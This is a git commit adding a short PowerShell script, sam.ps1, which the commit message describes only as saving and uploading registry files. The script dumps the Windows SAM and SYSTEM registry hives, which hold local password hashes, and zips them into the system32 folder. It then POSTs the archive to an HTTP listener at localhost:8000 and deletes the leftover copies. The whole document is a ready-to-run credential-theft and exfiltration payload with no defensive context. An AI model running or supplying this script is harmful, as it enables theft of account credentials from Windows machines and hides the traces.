938af09f7521f4d9fb1ee13a240b3060f9e378e2
Lex <104235290+VBV11@users.noreply.github.com>
2026-07-02 11:52:30 +0200

    Add PowerShell script to save and upload registry files

---
+++ sam.ps1
@@ -0,0 +1,8 @@
+reg save hklm\sam 1337OMGsam;
+reg save hklm\system 1337OMGsys;
+Compress-Archive -Path "$PWD\1337OMGsys", "$PWD\1337OMGsam" -DestinationPath "C:\WINDOWS\system32\OMGdump.zip" -Force;
+$file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\OMGdump.zip");
+iwr "http://localhost:8000" -Method POST -Body $file -UseBasicParsing;
+remove-item 1337OMGsys;
+remove-item 1337OMGsam;
+exit
